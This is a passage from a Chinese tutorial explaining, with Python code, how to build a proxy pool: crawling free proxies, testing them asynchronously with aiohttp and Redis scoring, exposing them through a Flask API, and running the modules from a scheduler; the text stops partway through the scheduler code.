                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> proxypool.crawlers.base <span class="keyword">import</span> BaseCrawler</span><br><span class="line"><span class="keyword">from</span> proxypool.schemas.proxy <span class="keyword">import</span> Proxy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MAX_PAGE = <span class="number">5</span></span><br><span class="line">BASE_URL = <span class="string">'http://www.ip3366.net/free/?stype=1&amp;page=&#123;page&#125;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IP3366Crawler</span><span class="params">(BaseCrawler)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ip3366 crawler, http://www.ip3366.net/</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    urls = [BASE_URL.format(page=i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, html)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        parse html file to get proxies</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        ip_address = re.compile(<span class="string">'&lt;tr&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;'</span>)</span><br><span class="line">        <span class="comment"># \s * 匹配空格，起到换行作用</span></span><br><span class="line">        re_ip_address = ip_address.findall(html)</span><br><span class="line">        <span class="keyword">for</span> address, port <span class="keyword">in</span> re_ip_address:</span><br><span class="line">            proxy = Proxy(host=address.strip(), port=int(port.strip()))</span><br><span class="line">            <span class="keyword">yield</span> proxy</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里定义了一个代理类 <code>Crawler</code>，用来抓取某一网站的代理，这里抓取的是 IP3366 的公开代理，通过 <code>parse</code> 方法来解析页面的源码并构造一个个 Proxy 对象返回即可。</p>
                  <p>另外，在其父类 <code>BaseCrawler</code> 里面定义了通用的页面抓取方法，它可以读取子类里面定义的 <code>urls</code> 全局变量并进行爬取，然后调用子类的 <code>parse</code> 方法来解析页面，代码实现如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> retrying <span class="keyword">import</span> retry</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseCrawler</span><span class="params">(object)</span>:</span></span><br><span class="line">    urls = []</span><br><span class="line"></span><br><span class="line"><span class="meta">    @retry(stop_max_attempt_number=3, retry_on_result=lambda x: x is None)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fetch</span><span class="params">(self, url, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url, **kwargs)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">except</span> requests.ConnectionError:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @logger.catch</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crawl</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        crawl main method</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> self.urls:</span><br><span class="line">            logger.info(<span class="string">f'fetching <span class="subst">&#123;url&#125;</span>'</span>)</span><br><span class="line">            html = self.fetch(url)</span><br><span class="line">            <span class="keyword">for</span> proxy <span class="keyword">in</span> self.parse(html):</span><br><span class="line">                logger.info(<span class="string">f'fetched proxy <span class="subst">&#123;proxy.string()&#125;</span> from <span class="subst">&#123;url&#125;</span>'</span>)</span><br><span class="line">                <span class="keyword">yield</span> proxy</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果要扩展一个代理的 <code>Crawler</code>，只需要集成 <code>BaseCrawler</code> 并实现 <code>parse</code> 方法即可，扩展性较好。</p>
                  <p>因此，这一个个的 <code>Crawler</code> 就可以针对各个不同的代理网站进行代理的抓取。最后，有一个统一的方法将 <code>Crawler</code> 汇总起来，遍历调用即可。</p>
                  <p>如何汇总呢？这里我们可以检测代码只要定义有 <code>BaseCrawler</code> 的子类就算一个有效的代理 <code>Crawler</code>，可以直接通过遍历 Python 文件包的方式来获取，代码实现如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> pkgutil</span><br><span class="line"><span class="keyword">from</span> .base <span class="keyword">import</span> BaseCrawler</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="comment"># load classes subclass of BaseCrawler</span></span><br><span class="line">classes = []</span><br><span class="line"><span class="keyword">for</span> loader, name, is_pkg <span class="keyword">in</span> pkgutil.walk_packages(__path__):</span><br><span class="line">    module = loader.find_module(name).load_module(name)</span><br><span class="line">    <span class="keyword">for</span> name, value <span class="keyword">in</span> inspect.getmembers(module):</span><br><span class="line">        globals()[name] = value</span><br><span class="line">        <span class="keyword">if</span> inspect.isclass(value) <span class="keyword">and</span> issubclass(value, BaseCrawler) <span class="keyword">and</span> value <span class="keyword">is</span> <span class="keyword">not</span> BaseCrawler:</span><br><span class="line">            classes.append(value)</span><br><span class="line">__all__ = __ALL__ = classes</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们调用了 <code>walk_packages</code> 方法，遍历了整个 crawlers 模块下的类，并判断它是 <code>BaseCrawler</code> 的子类，那就将其添加到结果中并返回。</p>
                  <p>最后，只要将 <code>classes</code> 遍历并依次实例化，调用其 <code>crawl</code> 方法即可完成代理的爬取和提取，代码实现见 <a href="https://github.com/Python3WebSpider/ProxyPool/blob/master/proxypool/processors/getter.py。" target="_blank" rel="noopener">https://github.com/Python3WebSpider/ProxyPool/blob/master/proxypool/processors/getter.py。</a></p>
                  <h3 id="检测模块"><a href="#检测模块" class="headerlink" title="检测模块"></a>检测模块</h3>
                  <p>我们已经成功将各个网站的代理获取下来了，现在需要一个检测模块来对所有代理进行多轮检测。代理检测可用，分数就设置为 100，代理不可用，分数就减 1，这样可以实时改变每个代理的可用情况。如果要获取有效代理，只需要获取分数高的代理即可。</p>
                  <p>由于代理的数量非常多，为了提高代理的检测效率，这里使用异步请求库 aiohttp 来检测。</p>
                  <p>requests 作为一个同步请求库，我们在发出一个请求之后，程序需要等待网页加载完成之后才能继续执行。也就是这个过程会阻塞等待响应，如果服务器响应非常慢，比如一个请求等待十几秒，那么我们使用 requests 完成一个请求就会需要十几秒的时间，程序也不会继续往下执行，而在这十几秒的时间里，程序其实完全可以去做其他的事情，比如调度其他的请求或者进行网页解析等。</p>
                  <p>对于响应速度比较快的网站来说，requests 同步请求和 aiohttp 异步请求的效果差距没那么大。可对于检测代理来说，检测一个代理一般需要十多秒甚至几十秒的时间，这时候使用 aiohttp 异步请求库的优势就大大体现出来了，效率可能会提高几十倍不止。</p>
                  <p>所以，我们的代理检测使用异步请求库 aiohttp，实现示例如下所示：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> proxypool.schemas <span class="keyword">import</span> Proxy</span><br><span class="line"><span class="keyword">from</span> proxypool.storages.redis <span class="keyword">import</span> RedisClient</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> TEST_TIMEOUT, TEST_BATCH, TEST_URL, TEST_VALID_STATUS</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientProxyConnectionError, ServerDisconnectedError, ClientOSError, ClientHttpProxyError</span><br><span class="line"><span class="keyword">from</span> asyncio <span class="keyword">import</span> TimeoutError</span><br><span class="line"></span><br><span class="line">EXCEPTIONS = (</span><br><span class="line">    ClientProxyConnectionError,</span><br><span class="line">    ConnectionRefusedError,</span><br><span class="line">    TimeoutError,</span><br><span class="line">    ServerDisconnectedError,</span><br><span class="line">    ClientOSError,</span><br><span class="line">    ClientHttpProxyError</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tester</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    tester for testing proxies in queue</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        init redis</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.redis = RedisClient()</span><br><span class="line">        self.loop = asyncio.get_event_loop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self, proxy: Proxy)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        test single proxy</span></span><br><span class="line"><span class="string">        :param proxy: Proxy object</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=<span class="literal">False</span>)) <span class="keyword">as</span> session:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                logger.debug(<span class="string">f'testing <span class="subst">&#123;proxy.string()&#125;</span>'</span>)</span><br><span class="line">                <span class="keyword">async</span> <span class="keyword">with</span> session.get(TEST_URL, proxy=<span class="string">f'http://<span class="subst">&#123;proxy.string()&#125;</span>'</span>, timeout=TEST_TIMEOUT,</span><br><span class="line">                                       allow_redirects=<span class="literal">False</span>) <span class="keyword">as</span> response:</span><br><span class="line">                    <span class="keyword">if</span> response.status <span class="keyword">in</span> TEST_VALID_STATUS:</span><br><span class="line">                        self.redis.max(proxy)</span><br><span class="line">                        logger.debug(<span class="string">f'proxy <span class="subst">&#123;proxy.string()&#125;</span> is valid, set max score'</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        self.redis.decrease(proxy)</span><br><span class="line">                        logger.debug(<span class="string">f'proxy <span class="subst">&#123;proxy.string()&#125;</span> is invalid, decrease score'</span>)</span><br><span class="line">            <span class="keyword">except</span> EXCEPTIONS:</span><br><span class="line">                self.redis.decrease(proxy)</span><br><span class="line">                logger.debug(<span class="string">f'proxy <span class="subst">&#123;proxy.string()&#125;</span> is invalid, decrease score'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @logger.catch</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        test main method</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># event loop of aiohttp</span></span><br><span class="line">        logger.info(<span class="string">'stating tester...'</span>)</span><br><span class="line">        count = self.redis.count()</span><br><span class="line">        logger.debug(<span class="string">f'<span class="subst">&#123;count&#125;</span> proxies to test'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, count, TEST_BATCH):</span><br><span class="line">            <span class="comment"># start end end offset</span></span><br><span class="line">            start, end = i, min(i + TEST_BATCH, count)</span><br><span class="line">            logger.debug(<span class="string">f'testing proxies from <span class="subst">&#123;start&#125;</span> to <span class="subst">&#123;end&#125;</span> indices'</span>)</span><br><span class="line">            proxies = self.redis.batch(start, end)</span><br><span class="line">            tasks = [self.test(proxy) <span class="keyword">for</span> proxy <span class="keyword">in</span> proxies]</span><br><span class="line">            <span class="comment"># run tasks using event loop</span></span><br><span class="line">            self.loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    tester = Tester()</span><br><span class="line">    tester.run()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里定义了一个类 <code>Tester</code>，<code>__init__</code> 方法中建立了一个 <code>RedisClient</code> 对象，供该对象中其他方法使用。接下来，定义了一个 <code>test</code> 方法，这个方法用来检测单个代理的可用情况，其参数就是被检测的代理。注意，<code>test</code> 方法前面加了 <code>async</code> 关键词，这代表这个方法是异步的。方法内部首先创建了 aiohttp 的 <code>ClientSession</code> 对象，可以直接调用该对象的 <code>get</code> 方法来访问页面。</p>
                  <p>测试链接在这里定义为常量 <code>TEST_URL</code>。如果针对某个网站有抓取需求，建议将 <code>TEST_URL</code> 设置为目标网站的地址，因为在抓取过程中，代理本身可能是可用的，但是该代理的 IP 已经被目标网站封掉了。例如，某些代理可以正常访问百度等页面，但是对知乎来说可能就被封了，所以我们可以将 <code>TEST_URL</code> 设置为知乎的某个页面的链接。当请求失败、代理被封时，分数自然会减下来，失效的代理就不会被取到了。</p>
                  <p>如果想做一个通用的代理池，则不需要专门设置 <code>TEST_URL</code>，既可以将其设置为一个不会封 IP 的网站，也可以设置为百度这类响应稳定的网站。</p>
                  <p>我们还定义了 <code>TEST_VALID_STATUS</code> 变量，这个变量是一个列表形式，包含了正常的状态码，如可以定义成 <code>[200]</code>。当然，某些目标网站可能会出现其他的状态码，可以自行配置。</p>
                  <p>程序在获取响应后需要判断响应的状态，如果状态码在 <code>TEST_VALID_STATUS</code> 列表里，则代表代理可用，可以调用 <code>RedisClient</code> 的 <code>max</code> 方法将代理分数设为 100，否则调用 <code>decrease</code> 方法将代理分数减 1，如果出现异常，也同样将代理分数减 1。</p>
                  <p>另外，我们设置了批量测试的最大值 <code>TEST_BATCH</code>，也就是一批测试最多 <code>TEST_BATCH</code> 个，这可以避免代理池过大时一次性测试全部代理导致内存开销过大的问题。当然，也可以用信号量来实现并发控制。</p>
                  <p>随后，在 <code>run</code> 方法里面获取了所有的代理列表，使用 aiohttp 分配任务，启动运行。这样在不断的运行过程中，代理池中无效代理的分数会一直被减 1，直至被清除，有效的代理则会一直保持 100 分，供随时取用。</p>
                  <p>这样测试模块的逻辑就完成了。</p>
                  <h3 id="接口模块"><a href="#接口模块" class="headerlink" title="接口模块"></a>接口模块</h3>
                  <p>通过上述 3 个模块，我们已经可以做到代理的获取、检测和更新，数据库就会以有序集合的形式存储各个代理及其对应的分数，分数 100 代表可用，分数越小代表越不可用。</p>
                  <p>但是我们怎样方便地获取可用代理呢？可以用 <code>RedisClient</code> 类直接连接 Redis，然后调用 <code>random</code> 方法。这样做没问题，效率很高，但是会有几个弊端。</p>
                  <ul>
                    <li>如果其他人使用这个代理池，他需要知道 Redis 连接的用户名和密码信息，这样很不安全。</li>
                    <li>如果代理池需要部署在远程服务器上运行，而远程服务器的 Redis 只允许本地连接，那么我们就不能远程直连 Redis 来获取代理。</li>
                    <li>如果爬虫所在的主机没有连接 Redis 模块，或者爬虫不是由 Python 语言编写的，那么我们就无法使用 <code>RedisClient</code> 来获取代理。</li>
                    <li>如果 <code>RedisClient</code> 类或者数据库结构有更新，那么爬虫端必须同步这些更新，这样非常麻烦。</li>
                  </ul>
                  <p>综上考虑，为了使代理池可以作为一个独立服务运行，我们最好增加一个接口模块，并以 Web API 的形式暴露可用代理。</p>
                  <p>这样一来，获取代理只需要请求接口即可，以上的几个缺点也可以避免。</p>
                  <p>我们使用一个比较轻量级的库 Flask 来实现这个接口模块，实现示例如下所示：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, g</span><br><span class="line"><span class="keyword">from</span> proxypool.storages.redis <span class="keyword">import</span> RedisClient</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> API_HOST, API_PORT, API_THREADED</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">'app'</span>]</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_conn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    get redis client object</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> hasattr(g, <span class="string">'redis'</span>):</span><br><span class="line">        g.redis = RedisClient()</span><br><span class="line">    <span class="keyword">return</span> g.redis</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    get home page, you can define your own templates</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h2&gt;Welcome to Proxy Pool System&lt;/h2&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/random')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proxy</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    get a random proxy</span></span><br><span class="line"><span class="string">    :return: get a random proxy</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    conn = get_conn()</span><br><span class="line">    <span class="keyword">return</span> conn.random().string()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/count')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_count</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    get the count of proxies</span></span><br><span class="line"><span class="string">    :return: count, int</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    conn = get_conn()</span><br><span class="line">    <span class="keyword">return</span> str(conn.count())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=API_HOST, port=API_PORT, threaded=API_THREADED)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们声明了一个 Flask 对象，定义了 3 个接口，分别是首页、随机代理页和获取数量页。</p>
                  <p>运行之后，Flask 会启动一个 Web 服务，我们只需要访问对应的接口即可获取到可用代理。</p>
                  <h3 id="调度模块"><a href="#调度模块" class="headerlink" title="调度模块"></a>调度模块</h3>
                  <p>调度模块就是调用上面所定义的 3 个模块，将这 3 个模块通过多进程的形式运行起来，示例如下所示：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> proxypool.processors.server <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> proxypool.processors.getter <span class="keyword">import</span> Getter</span><br><span class="line"><span class="keyword">from</span> proxypool.processors.tester <span class="keyword">import</span> Tester</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> CYCLE_GETTER, CYCLE_TESTER, API_HOST, API_THREADED, API_PORT, ENABLE_SERVER, \</span><br><span class="line">    ENABLE_GETTER, ENABLE_TESTER, IS_WINDOWS</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> IS_WINDOWS:</span><br><span class="line">    multiprocessing.freeze_support()</span><br><span class="line"></span><br><span class="line">tester_process, getter_process, server_process = <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scheduler</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    scheduler</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_tester</span><span class="params">(self, cycle=CYCLE_TESTER)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        run tester</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ENABLE_TESTER:</span><br><span class="line">            logger.info(<span class="string">'tester not enabled, exit'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        tester = Tester()</span><br><span class="line">        loop = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            logger.debug(<span class="string">f'tester loop <span class="subst">&#123;loop&#125;</span> start...'</span>)</span><br><span class="line">            tester.run()</span><br><span class="line">            loop += <span class="number">1</span></span><br><span class="line">            time.sleep(cycle)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_getter</span><span class="params">(self, cycle=CYCLE_GETTER)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        run getter</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ENABLE_GETTER:</span><br><span class="line">            logger.info(<span class="string">'getter not enabled, exit'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        getter = Getter()</span><br><span class="line">        loop = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            logger.debug(<span class="string">f'getter loop <span class="subst">&#123;loop&#125;</span> start...'</span>)</span><br><span class="line">            getter.run()</span><br><span class="line">            loop += <span class="number">1</span></span><br><span class="line">            time.sleep(cycle)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_server</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        run server for api</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ENABLE_SERVER:</span><br><span class="line">            logger.info(<span class="string">'server not enabled, exit'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        app.run(host=API_HOST, port=API_PORT, threaded=API_THREADED)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> tester_process, getter_process, server_process</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logger.info(<span class="string">'starting proxypool...'</span>)</span><br><span class="line">            <span class="keyword">if</span> ENABLE_TESTER:</span><br><span class="line">                tester_process = multiprocessing.Process(target=self.run_tester)</span><br><span class="line">                logger.info(<span 